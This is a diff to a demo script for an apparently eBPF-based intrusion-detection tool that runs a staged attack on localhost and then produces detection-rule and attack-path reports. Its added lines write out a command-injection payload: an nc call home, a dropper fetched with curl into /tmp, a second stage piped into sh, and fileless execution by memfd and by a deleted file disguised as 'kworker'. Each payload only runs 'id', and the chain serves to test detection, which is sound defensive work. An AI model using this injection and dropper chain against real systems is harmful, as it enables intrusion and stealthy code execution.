@@ -11,13 +11,22 @@
 #   1. a listener on 4444 (nc -l), standing in for an attacker's catcher;
 #   2. a vulnerable web app on 8080 (tools/demo/webapp.py);
 #   3. three ordinary requests to it (curl);
-#   4. one request that injects a command: the app's shell runs `nc 127.0.0.1 4444`;
+#   4. one request that injects a command. The app's shell then:
+#      a. runs `nc 127.0.0.1 4444` (a call home to the catcher);
+#      b. downloads a binary from a stager on 8000 into /tmp and runs it (a dropper: the binary is
+#         a copy of `id`);
+#      c. pipes a second-stage script from the stager into sh. The script runs `id` twice more,
+#         without a file on disk: once from a memfd, once from a file it deleted while holding it
+#         open;
 #   5. a small scan of three closed ports (blocking connects, so each is refused at once).
+# Afterwards the run's graph is built (python3 -m p15.graph), the detection rules run over it
+# (p15.graph.rules), and the attack path from the shell the web app started is written
+# (p15.graph.story, as text and HTML). Every payload is harmless: it prints the user id.
 set -u
 OUT=${1:?usage: run_demo.sh OUT_DIR}
 B=${B:-build}
 PY=${P15_PYTHON:-python3}
-WEB=8080 C2=4444
+WEB=8080 C2=4444 STAGER=8000
 [ "$(id -u)" = 0 ] || { echo "run_demo: needs root (p15d loads BPF programs)"; exit 2; }
 for t in curl nc timeout; do
     command -v $t >/dev/null || { echo "run_demo: '$t' is missing (apt install curl netcat-openbsd coreutils)"; exit 2; }
@@ -39,21 +48,45 @@ log "1. listener on $C2: nc pid $CATCH"
 "$PY" tools/demo/webapp.py $WEB 2>>"$OUT/webapp.log" &
 APP=$!
 log "2. web app on $WEB: pid $APP"
+mkdir -p "$OUT/stager"
+cp /usr/bin/id "$OUT/stager/k"
+cat >"$OUT/stager/s2" <<'S2'
+# stage 2 of the demo: two runs of `id` with no file left on disk
+python3 - <<'PY'
+import os, shutil
+fd = os.memfd_create("kworker")                    # from memory: a memfd holding a copy of id
+os.write(fd, open("/usr/bin/id", "rb").read())
+if os.fork() == 0:
+    os.execv(f"/proc/self/fd/{fd}", ["kworker"])
+os.wait()
+p = "/var/tmp/.upd-p15demo"                        # from a deleted file, on a disk filesystem
+shutil.copy("/usr/bin/id", p)
+d = os.open(p, os.O_RDONLY)
+os.unlink(p)
+if os.fork() == 0:
+    os.execv(f"/proc/self/fd/{d}", ["upd"])
+os.wait()
+PY
+S2
+"$PY" -m http.server $STAGER --bind 127.0.0.1 --directory "$OUT/stager" 2>>"$OUT/stager.log" >/dev/null &
+STG=$!
+log "2b. stager on $STAGER: pid $STG (serves k, a copy of id, and s2)"
 sleep 1
 for path in / /about /lookup?name=localhost; do
     curl -s "http://127.0.0.1:$WEB$path" >/dev/null
     log "3. curl $path: done"
     sleep 0.5
 done
-curl -s "http://127.0.0.1:$WEB/lookup?name=localhost%3Bnc%20-w1%20127.0.0.1%20$C2%20%3C/dev/null" >/dev/null
-log "4. injected request sent: the app's shell ran nc to $C2"
+INJ="localhost;nc -w1 127.0.0.1 $C2 </dev/null;curl -s http://127.0.0.1:$STAGER/k -o /tmp/.k;chmod +x /tmp/.k;/tmp/.k;curl -s http://127.0.0.1:$STAGER/s2|sh"
+curl -s "http://127.0.0.1:$WEB/lookup?name=$("$PY" -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1], safe=""))' "$INJ")" >/dev/null
+log "4. injected request sent: the app's shell ran nc to $C2, then the dropper and stage 2 from $STAGER"
 sleep 1
 for p in 4441 4442 4443; do
     timeout 2 bash -c "exec 3<>/dev/tcp/127.0.0.1/$p" 2>/dev/null
     log "5. scan of port $p: refused, as expected"
 done
 sleep 1
-kill $APP $CATCH 2>/dev/null; wait $APP $CATCH 2>/dev/null
+kill $APP $CATCH $STG 2>/dev/null; wait $APP $CATCH $STG 2>/dev/null; rm -f /tmp/.k
 log "p15d: waiting for the end of its 30 s"
 wait $P15D; rc=$?
 log "p15d: exit $rc"
@@ -63,9 +96,19 @@ ok=0
 for port in $WEB $C2 4442; do
     tools/p15-trace --port $port "$RUN" --html "$OUT/port-$port.html" >"$OUT/port-$port.txt" || ok=1
 done
-(cd "$OUT" && find . -type f ! -name SHA256SUMS | sort | xargs sha256sum >SHA256SUMS)
+# the graph, the rules over it, and the attack path from the shell the web app started
+g=0
+PYTHONPATH=python "$PY" -m p15.graph "$RUN" "$OUT/graph.duckdb" >"$OUT/graph.txt" 2>&1 || g=1
+PYTHONPATH=python "$PY" -m p15.graph.rules "$OUT/graph.duckdb" >"$OUT/rules.txt" 2>&1 || g=1
+PYTHONPATH=python "$PY" -m p15.graph.story "$OUT/graph.duckdb" --alert R4 --html "$OUT/attack-path.html" \
+    >"$OUT/attack-path.txt" 2>&1 || g=1
+(cd "$OUT" && find . -type f ! -name SHA256SUMS ! -name '*.duckdb' | sort | xargs sha256sum >SHA256SUMS)
 chmod -R a+rX "$OUT"
 echo
 cat "$OUT/port-$C2.txt"
-echo "run_demo: p15d exit $rc, p15w-inspect exit $irc, reports $([ $ok = 0 ] && echo made || echo FAILED); files in $OUT"
-[ $rc = 0 ] && [ $irc = 0 ] && [ $ok = 0 ]
+echo
+cat "$OUT/rules.txt"
+echo
+cat "$OUT/attack-path.txt"
+echo "run_demo: p15d exit $rc, p15w-inspect exit $irc, reports $([ $ok = 0 ] && echo made || echo FAILED), graph $([ $g = 0 ] && echo made || echo FAILED); files in $OUT"
+[ $rc = 0 ] && [ $irc = 0 ] && [ $ok = 0 ] && [ $g = 0 ]
